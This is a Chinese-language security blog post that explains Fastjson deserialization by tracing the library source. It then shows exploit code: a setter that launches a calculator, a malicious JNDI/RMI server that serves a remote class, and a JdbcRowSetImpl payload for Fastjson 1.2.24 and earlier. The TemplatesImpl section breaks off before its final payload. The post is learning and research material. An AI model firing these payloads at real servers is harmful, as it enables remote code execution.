@@ -1,0 +1,1263 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Fastjson反序列化 | Bloyet&#39;s blog</title>
+<link rel="shortcut icon" href="https://bloyet.github.io/favicon.ico?v=1752383988636">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bloyet.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Fastjson反序列化 | Bloyet&#39;s blog - Atom Feed" href="https://bloyet.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Fastjson介绍
+fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。
+由于其特点是快..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://bloyet.github.io">
+  <img class="avatar" src="https://bloyet.github.io/images/avatar.png?v=1752383988636" alt="">
+  </a>
+  <h1 class="site-title">
+    Bloyet&#39;s blog
+  </h1>
+  <p class="site-description">
+    做那个人的战士，和他一起去经历，失败!
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          Home
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/friends" class="menu">
+          Friends
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Fastjson反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-06-10
+              </span>
+              <span>
+                34 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="fastjson介绍">Fastjson介绍</h1>
+<p>fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。<br>
+由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第一次报告安全漏洞至今，进行了若干次的安全更新，也与安全研究人员进行了来来回回多次的安全补丁-绕过的流程。</p>
+<h1 id="fastjson基础学习">Fastjson基础学习</h1>
+<p>fastjson主要通过将一个json格式的文件转为一个java的对象，或者将一个java对象转为一个json格式的对象，但是这里的转化是需要满足一定条件，不是所有的对象都可以直接转为json格式，其中转化的过程就是通过序列化和反序列化，当然这个就与原生的jdk版本没有太多关联，这个属于插件存在的漏洞</p>
+<p>在fastjson进行转换时，必须需要类有一个无参构造方法，最好是通过java bean的格式进行书写，因为如果不是满足java bean则在对json反序列化为对象时可能会出现赋值问题，如果是private或者protected的属性就无法直接进行赋值给反序列化的对象，而如果是public类型的成员变量，就算没有setter方法，还是可以进行赋值的，会通过反射进行赋值</p>
+<p>代码：</p>
+<pre><code class="language-java">package org.example;
+
+public class Main {
+    public String name;
+    public int age;
+    protected String sex;
+
+    public Main() {
+    }
+
+    public Main(String name, int age, String sex) {
+        this.name = name;
+        this.age = age;
+        this.sex = sex;
+    }
+
+    public String getName() {
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public int getAge() {
+        return age;
+    }
+
+    public void setAge(int age) {
+        this.age = age;
+    }
+
+    public String getSex() {
+        return sex;
+    }
+
+    public void setSex(String sex) {
+        this.sex = sex;
+    }
+
+}
+</code></pre>
+<pre><code class="language-java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class text{
+    public static void main(String[] args) {
+        Main main = new Main();
+        main.setName(&quot;Bloyet&quot;);
+        String fastjson = JSON.toJSONString(main, SerializerFeature.WriteClassName);
+        System.out.println(fastjson);
+        Object main1 = JSON.parse(fastjson);
+        System.out.println(main1);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1749492821777.png" alt="" loading="lazy"></figure>
+<p>我们发现结果出现了@type字样</p>
+<p>如果不使用SerializerFeature.WriteClassName，该方法默认将JSON字符串反序列化为一个JSONObject对象。</p>
+<pre><code class="language-java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class text{
+    public static void main(String[] args) {
+        Main main = new Main();
+        main.setName(&quot;Bloyet&quot;);
+        String fastjson = JSON.toJSONString(main);
+        System.out.println(fastjson);
+        Object main1 = JSON.parse(fastjson);
+        System.out.println(main1);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1749492821801.png" alt="" loading="lazy"></figure>
+<h1 id="fastjson调用简单分析">Fastjson调用简单分析</h1>
+<h2 id="序列化">序列化</h2>
+<p>序列化过程其实没什么好看的，只要知道</p>
+<p>获取属性值分为有无getter，如果没有getter方法，它就无法直接获取private属性或者protected属性，如果为public属性它就会看是否赋初始值，如果没有就表示默认值  有getter方法就getter方法优先</p>
+<pre><code class="language-java">package org.example;
+
+public class Main {
+    public String name;
+    public int age;
+    protected String sex;
+
+    public Main() {
+    }
+
+    public Main(String name, int age, String sex) {
+        this.name = name;
+        this.age = age;
+        this.sex = sex;
+    }
+
+    public String getName() {
+        System.out.println(&quot;调用了geName方法&quot;);
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public int getAge() {
+        System.out.println(&quot;调用了getAge方法&quot;);
+        return age;
+
+    }
+
+    public void setAge(int age) {
+        this.age = age;
+    }
+
+    public String getSex() {
+        System.out.println(&quot;调用了getSex方法&quot;);
+        return sex;
+    }
+
+    public void setSex(String sex) {
+        this.sex = sex;
+    }
+
+}
+</code></pre>
+<pre><code class="language-java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class text{
+    public static void main(String[] args) {
+        Main main = new Main();
+        // main.setName(&quot;Bloyet&quot;);
+        String fastjson = JSON.toJSONString(main, SerializerFeature.WriteClassName);
+        // System.out.println(fastjson);
+        //  Object main1 = JSON.parse(fastjson);
+        // System.out.println(main1);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1749492821817.png" alt="" loading="lazy"></figure>
+<p>从这个结果来看，也能知道它获取属性值的时候，是通过调用了getter方法</p>
+<h2 id="反序列化">反序列化</h2>
+<p>Fastjson 使用 <code>@type</code> 来标识 JSON 数据中应该反序列化为哪个类。在 JSON 中，<code>@type</code> 字段通常包含了类的全限定名（类的完整路径），用于标识具体的类。</p>
+<p>进源码分析：</p>
+<p>断点打在这里</p>
+<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1749492821832.png" alt="" loading="lazy"></figure>
+<p>本质上还是调用的是parse方法，步入</p>
+<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1749492821848.png" alt="" loading="lazy"></figure>
+<p>继续调用parse方法，步入</p>
+<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1749492821863.png" alt="" loading="lazy"></figure>
+<p>使用传入的 <code>text</code> 和 <code>features</code> 创建一个 <code>DefaultJSONParser</code> 对象。<code>ParserConfig.getGlobalInstance()</code> 表示使用全局配置，确保解析器的行为符合统一的配置标准。DefaultJSONParser这个对象用于实际解析 JSON 文本。我们继续看parser.parse方法</p>
+<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1749492821879.png" alt="" loading="lazy"></figure>
+<p>继续步入</p>
+<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1749492821895.png" alt="" loading="lazy"></figure>
+<p>进入switch语句，token为12</p>
+<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1749492821910.png" alt="" loading="lazy"></figure>
+<p><code>JSONObject</code> 类在 Java 中是处理和操作 JSON 数据的重要工具 ，我们继续跟进parseObject方法</p>
+<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1749492821925.png" alt="" loading="lazy"></figure>
+<p>这个方法里面的内容还挺多的，大致就是根据字符来进行逻辑判断，然后由逻辑判断走到处理方法  我们这里就看关键的@type</p>
+<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1749492821941.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1749492821957.png" alt="" loading="lazy"></figure>
+<p>这里的JSON.DEFAULT_TYPE_KEY就是@type，进入if语句 进行类加载，接着看怎么加载的，步入loadClass方法</p>
+<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1749492821988.png" alt="" loading="lazy"></figure>
+<p>可以看到虽然是进行类加载，但是其实里面是没有内容的，相当于一个空壳，然后返回clazz，继续往下走</p>
+<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1749492822004.png" alt="" loading="lazy"></figure>
+<p>回到了DefaultJSONParser#parseObject方法，这里是<strong>获取解析器</strong>的地方，步入getDeserializer方法</p>
+<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1749492822019.png" alt="" loading="lazy"></figure>
+<p>这里判断了一下当前缓存中是否存在能够直接获取到解析该 json 数据的解析器，如果有就直接返回了，很显然我们这里没有，所以还需要跟进<code>getDeserializer</code></p>
+<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1749492822034.png" alt="" loading="lazy"></figure>
+<p>这里的内容也很多，我们直接看createJavaBeanDeserializer方法，在这之前就是一些<strong>黑名单</strong>，和是否为数组，集合，Map，或者报错类，步入createJavaBeanDeserializer方法</p>
+<pre><code class="language-java">public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type) {
+    ObjectDeserializer derializer = (ObjectDeserializer)this.derializers.get(type);
+    if (derializer != null) {
+        return derializer;
+    } else {
+        if (type == null) {
+            type = clazz;
+        }
+
+        ObjectDeserializer derializer = (ObjectDeserializer)this.derializers.get(type);
+        if (derializer != null) {
+            return (ObjectDeserializer)derializer;
+        } else {
+            JSONType annotation = (JSONType)clazz.getAnnotation(JSONType.class);
+            if (annotation != null) {
+                Class&lt;?&gt; mappingTo = annotation.mappingTo();
+                if (mappingTo != Void.class) {
+                    return this.getDeserializer(mappingTo, mappingTo);
+                }
+            }
+
+            if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) {
+                derializer = (ObjectDeserializer)this.derializers.get(clazz);
+            }
+
+            if (derializer != null) {
+                return (ObjectDeserializer)derializer;
+            } else {
+                String className = clazz.getName();
+                className = className.replace('$', '.');
+
+                for(int i = 0; i &lt; this.denyList.length; ++i) {
+                    String deny = this.denyList[i];
+                    if (className.startsWith(deny)) {
+                        throw new JSONException(&quot;parser deny : &quot; + className);
+                    }
+                }
+
+                if (className.startsWith(&quot;java.awt.&quot;) &amp;&amp; AwtCodec.support(clazz) &amp;&amp; !awtError) {
+                    try {
+                        this.derializers.put(Class.forName(&quot;java.awt.Point&quot;), AwtCodec.instance);
+                        this.derializers.put(Class.forName(&quot;java.awt.Font&quot;), AwtCodec.instance);
+                        this.derializers.put(Class.forName(&quot;java.awt.Rectangle&quot;), AwtCodec.instance);
+                        this.derializers.put(Class.forName(&quot;java.awt.Color&quot;), AwtCodec.instance);
+                    } catch (Throwable var11) {
+                        awtError = true;
+                    }
+
+                    derializer = AwtCodec.instance;
+                }
+
+                if (!jdk8Error) {
+                    try {
+                        if (className.startsWith(&quot;java.time.&quot;)) {
+                            this.derializers.put(Class.forName(&quot;java.time.LocalDateTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.LocalDate&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.LocalTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.ZonedDateTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.OffsetDateTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.OffsetTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.ZoneOffset&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.ZoneRegion&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.ZoneId&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.Period&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.Duration&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.Instant&quot;), Jdk8DateCodec.instance);
+                            derializer = (ObjectDeserializer)this.derializers.get(clazz);
+                        } else if (className.startsWith(&quot;java.util.Optional&quot;)) {
+                            this.derializers.put(Class.forName(&quot;java.util.Optional&quot;), OptionalCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.util.OptionalDouble&quot;), OptionalCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.util.OptionalInt&quot;), OptionalCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.util.OptionalLong&quot;), OptionalCodec.instance);
+                            derializer = (ObjectDeserializer)this.derializers.get(clazz);
+                        }
+                    } catch (Throwable var10) {
+                        jdk8Error = true;
+                    }
+                }
+
+                if (className.equals(&quot;java.nio.file.Path&quot;)) {
+                    this.derializers.put(clazz, MiscCodec.instance);
+                }
+
+                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+
+                try {
+                    Iterator var17 = ServiceLoader.load(AutowiredObjectDeserializer.class, classLoader).iterator();
+
+                    while(var17.hasNext()) {
+                        AutowiredObjectDeserializer autowired = (AutowiredObjectDeserializer)var17.next();
+                        Iterator var8 = autowired.getAutowiredFor().iterator();
+
+                        while(var8.hasNext()) {
+                            Type forType = (Type)var8.next();
+                            this.derializers.put(forType, autowired);
+                        }
+                    }
+                } catch (Exception var12) {
+                }
+
+                if (derializer == null) {
+                    derializer = (ObjectDeserializer)this.derializers.get(type);
+                }
+
+                if (derializer != null) {
+                    return (ObjectDeserializer)derializer;
+                } else {
+                    if (clazz.isEnum()) {
+                        derializer = new EnumDeserializer(clazz);
+                    } else if (clazz.isArray()) {
+                        derializer = ObjectArrayCodec.instance;
+                    } else if (clazz != Set.class &amp;&amp; clazz != HashSet.class &amp;&amp; clazz != Collection.class &amp;&amp; clazz != List.class &amp;&amp; clazz != ArrayList.class) {
+                        if (Collection.class.isAssignableFrom(clazz)) {
+                            derializer = CollectionCodec.instance;
+                        } else if (Map.class.isAssignableFrom(clazz)) {
+                            derializer = MapDeserializer.instance;
+                        } else if (Throwable.class.isAssignableFrom(clazz)) {
+                            derializer = new ThrowableDeserializer(this, clazz);
+                        } else {
+                            derializer = this.createJavaBeanDeserializer(clazz, (Type)type);
+                        }
+                    } else {
+                        derializer = CollectionCodec.instance;
+                    }
+
+                    this.putDeserializer((Type)type, (ObjectDeserializer)derializer);
+                    return (ObjectDeserializer)derializer;
+                }
+            }
+        }
+    }
+}
+</code></pre>
+<p>createJavaBeanDeserializer方法</p>
+<p>有很多关于 ASM 前置的检查，这个我们之后再看，<code>JavaBeanInfo.build</code>开始正式构造 beanInfo，步入</p>
+<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1749492822049.png" alt="" loading="lazy"></figure>
+<p>build 方法本身是返回一个 JavaBeanInfo 列表，javaBeanInfo里面储存了即将反序列化bean中的set方法，get方法，无参构造方法，属性值等具体信息，这个方法里面有很多检查的东西，我们先不看，直接看最重要的3个for循环</p>
+<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1749492822064.png" alt="" loading="lazy"></figure>
+<p>第一个 for 循环是用来获取 set 方法，第二个 for 循环是用来获取字段属性，第三个 for 循环是在获取 get 方法</p>
+<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1749492822080.png" alt="" loading="lazy"></figure>
+<p>我们先具体看第一个for，有四个 if 判断</p>
+<p>方法名长度大于4且以set开头，且第四个字母要是大写<br>
+非静态方法<br>
+返回类型为void或当前类<br>
+参数个数为1个</p>
+<pre><code class="language-java">Method[] var30 = methods;
+int var29 = methods.length;
+
+Method method;
+for(i = 0; i &lt; var29; ++i) {
+    method = var30[i];
+    ordinal = 0;
+    int serialzeFeatures = 0;
+    parserFeatures = 0;
+    String methodName = method.getName();
+    if (methodName.length() &gt;= 4 &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) {
+        Class&lt;?&gt;[] types = method.getParameterTypes();
+        if (types.length == 1) {
+            annotation = (JSONField)method.getAnnotation(JSONField.class);
+            if (annotation == null) {
+                annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);
+            }
+
+            if (annotation != null) {
+                if (!annotation.deserialize()) {
+                    continue;
+                }
+
+                ordinal = annotation.ordinal();
+                serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());
+                parserFeatures = Feature.of(annotation.parseFeatures());
+                if (annotation.name().length() != 0) {
+                    methodName = annotation.name();
+                    add(fieldList, new FieldInfo(methodName, method, (Field)null, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, (JSONField)null, (String)null));
+                    continue;
+                }
+            }
+
+            if (methodName.startsWith(&quot;set&quot;)) {
+                c3 = methodName.charAt(3);
+                String propertyName;
+                if (!Character.isUpperCase((char)c3) &amp;&amp; c3 &lt;= 512) {
+                    if (c3 == 95) {
+                        propertyName = methodName.substring(4);
+                    } else if (c3 == 102) {
+                        propertyName = methodName.substring(3);
+                    } else {
+                        if (methodName.length() &lt; 5 || !Character.isUpperCase(methodName.charAt(4))) {
+                            continue;
+                        }
+
+                        propertyName = TypeUtils.decapitalize(methodName.substring(3));
+                    }
+                } else if (TypeUtils.compatibleWithJavaBean) {
+                    propertyName = TypeUtils.decapitalize(methodName.substring(3));
+                } else {
+                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
+                }
+
+                Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
+                if (field == null &amp;&amp; types[0] == Boolean.TYPE) {
+                    isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);
+                    field = TypeUtils.getField(clazz, isFieldName, declaredFields);
+                }
+
+                JSONField fieldAnnotation = null;
+                if (field != null) {
+                    fieldAnnotation = (JSONField)field.getAnnotation(JSONField.class);
+                    if (fieldAnnotation != null) {
+                        if (!fieldAnnotation.deserialize()) {
+                            continue;
+                        }
+
+                        ordinal = fieldAnnotation.ordinal();
+                        serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());
+                        parserFeatures = Feature.of(fieldAnnotation.parseFeatures());
+                        if (fieldAnnotation.name().length() != 0) {
+                            propertyName = fieldAnnotation.name();
+                            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));
+                            continue;
+                        }
+                    }
+                }
+
+                if (propertyNamingStrategy != null) {
+                    propertyName = propertyNamingStrategy.translate(propertyName);
+                }
+
+                add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));
+            }
+        }
+    }
+}
+</code></pre>
+<p>它最终会被 add 进 fieldInfo 数组，然后这里就没什么好看的了</p>
+<p>走完这里就开始真正解析了，ASM 解析器的原因我们并不能看到具体的内容，直接看源码分析</p>
+<p>当来到 createInstance 方法，它首先是实例化了一个空类，里面的属性值都为默认</p>
+<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1749492822096.png" alt="" loading="lazy"></figure>
+<p>调用setvalue方法，反射调用set方法</p>
+<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1749492822111.png" alt="" loading="lazy"></figure>
+<p>这里也就是利用点所在了</p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、<code>getter</code>方法、<code>setter</code>方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在</p>
+<p>简单利用：</p>
+<p>在set方法下面插入弹计算器的命令</p>
+<pre><code class="language-java">package org.example;
+
+import java.io.IOException;
+
+public class Main {
+  public String name=&quot;&quot;;
+  public int age;
+  protected String sex=&quot;&quot;;
+
+    public Main() {
+    }
+
+    public Main(String name, int age, String sex) {
+        this.name = name;
+        this.age = age;
+        this.sex = sex;
+    }
+
+    public String getName() {
+        System.out.println(&quot;调用了getName方法&quot;);
+        return name;
+    }
+
+    public void setName(String name) {
+        System.out.println(&quot;调用了setName方法&quot;);
+        this.name = name;
+    }
+
+    public int getAge() throws IOException {
+        System.out.println(&quot;调用了getAge方法&quot;);
+        return age;
+
+    }
+
+    public void setAge(int age) throws IOException {
+        System.out.println(&quot;调用了SetAge方法&quot;);
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        this.age = age;
+    }
+
+    public String getSex() {
+        System.out.println(&quot;调用了getSex方法&quot;);
+        return sex;
+    }
+
+    public void setSex(String sex) {
+        System.out.println(&quot;调用了setSex方法&quot;);
+        this.sex = sex;
+    }
+
+}
+package org.example;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+import java.io.IOException;
+
+public class text{
+    public static void main(String[] args) throws IOException {
+        Main main = new Main();
+        // main.setName(&quot;Bloyet&quot;);
+        String fastjson = JSON.toJSONString(main, SerializerFeature.WriteClassName);
+        System.out.println(fastjson);
+        Object main1 = JSON.parseObject(fastjson);
+        System.out.println(main1);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1749492822127.png" alt="" loading="lazy"></figure>
+<p>可以很清楚的看到，在序列化的时候就会自动调用getter方法，然后在反序列化的时候就都会调用</p>
+<p>FastJson中的 <code>parse()</code> 和 <code>parseObject()</code> 方法都可以用来将JSON字符串反序列化成Java对象，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但是 <code>parseObject()</code> 会额外的将Java对象转为 JSONObject对象，即 <code>JSON.toJSON()</code>。所以进行反序列化时的细节区别在于，<code>parse()</code> 会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，而 <code>parseObject()</code> 由于多执行了 <code>JSON.toJSON(obj)</code>，所以在处理过程中会调用反序列化目标类的所有 <code>setter</code> 和 <code>getter</code> 方法。</p>
+<p>补充一下poc的写法</p>
+<p>一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类</p>
+<pre><code class="language-java">{
+&quot;@type&quot;:&quot;xxx.xxx.xxx&quot;,
+&quot;xxx&quot;:&quot;xxx&quot;,
+...
+}
+</code></pre>
+<h1 id="fastjson1224利用链">Fastjson&lt;=1.2.24利用链</h1>
+<p>这个版本 主要是有两个利用链JdbcRowSetImpl和Templateslmpl</p>
+<h2 id="jdbcrowsetimpl">JdbcRowSetImpl</h2>
+<p>我们先来分析JdbcRowSetImpl（结合JNDI注入）</p>
+<p>JdbcRowSetImpl中有两个方法符合自动调用并且可以进行利用的：</p>
+<p>JdbcRowSetImpl#setDataSourceName</p>
+<pre><code class="language-java">public void setDataSourceName(String var1) throws SQLException {
+    if (this.getDataSourceName() != null) {
+        if (!this.getDataSourceName().equals(var1)) {
+            super.setDataSourceName(var1);
+            this.conn = null;
+            this.ps = null;
+            this.rs = null;
+        }
+    } else {
+        super.setDataSourceName(var1);
+    }
+
+}
+</code></pre>
+<p>JdbcRowSetImpl#setAutoCommit</p>
+<pre><code class="language-java">public void setAutoCommit(boolean var1) throws SQLException {
+    if (this.conn != null) {
+        this.conn.setAutoCommit(var1);
+    } else {
+        this.conn = this.connect();
+        this.conn.setAutoCommit(var1);
+    }
+
+}
+</code></pre>
+<p>在JdbcRowSetImpl#setAutoCommit 中调用了connect()方法</p>
+<p>JdbcRowSetImpl#connect</p>
+<pre><code class="language-java">private Connection connect() throws SQLException {
+    if (this.conn != null) {
+        return this.conn;
+    } else if (this.getDataSourceName() != null) {
+        try {
+            InitialContext var1 = new InitialContext();
+            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+            return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+        } catch (NamingException var3) {
+            throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+        }
+    } else {
+        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+    }
+}
+</code></pre>
+<p>回顾一下InitialContext类的作用</p>
+<p><code>InitialContext</code> 提供了一个默认的上下文环境，允许应用程序在其中查找和绑定对象。</p>
+<p>然后它还调用了lookup方法，参数还刚好就是我们在setDataSourceName方法中可以控制的，结合起来就可以进行JNDI注入了</p>
+<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1749492822143.png" alt="" loading="lazy"></figure>
+<h3 id="jndirmi">JNDI+RMI</h3>
+<p>开启服务</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class JNDI_server {
+    public static void main(String[] args) throws Exception {
+        LocateRegistry.createRegistry(1099);
+        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8000/&quot;);
+        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
+        Naming.bind(&quot;rmi://127.0.0.1:1099/Bloyet&quot;,referenceWrapper);
+    }
+}
+</code></pre>
+<p>然后在开启python服务</p>
+<p>然后就是EXP</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+
+
+public class JdbcRowSetImplEXP {
+    public static void main(String[] args) {
+
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
+    }
+}
+</code></pre>
+<p>基本上就是JNDI+RMI乱打，通过fastjson的反序列化冒充了我们之前的客户端</p>
+<h3 id="jndildap">JNDI+LDAP</h3>
+<p>差不多JNDI可以利用的这里都是可以的，这里就不写了</p>
+<h2 id="templatesimpl">TemplatesImpl</h2>
+<p>该链的利用面较窄，由于payload需要赋值的一些属性为<code>private</code>类型，需要在<code>parse()</code>反序列化时设置第二个参数<code>Feature.SupportNonPublicField</code>，服务端才能从JSON中恢复<code>private</code>类型的属性。</p>
+<p>由于部分需要我们更改的私有变量没有 setter 方法，需要使用 <code>Feature.SupportNonPublicField</code> 参数。</p>
+<p>这个类就很熟悉了，我们之前在打cb链的时候也利用到了getter方法的特性进行类加载</p>
+<pre><code class="language-java">TemplatesImpl.getOutputProperties
+      TemplatesImpl.newTransformer
+</code></pre>
+<p>我们还需要满足 <code>_name</code> 不为 null ，<code>_tfactory</code> 不为 null  这些都是CC3的内容了，这里就不多赘述</p>
+<p>然后又因为在fastjson中我们传入的_bytecodes为bytes类型，而Fastjson在序列化的时候会将bytes类型进行base64编码，反序列化的时候就会进行解码，所以我们在传入字节码的时候还需要进行编码</p>
+<p>编码：</p>
+<pre><code class="language-java">package org.example;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+public class text2 {
+    public static void main(String[] args) throws ClassNotFoundException, IOException {
+        byte[] _bytecodess = Files.readAllBytes(Paths.get(&quot;H:\\http.class&quot;));
+        String base64Encoded = Base64.getEncoder().encodeToString(_bytecodess);
+        System.out.println(base64Encoded);
+    }
+}
+</code></pre>
+<p>json格式：</p>
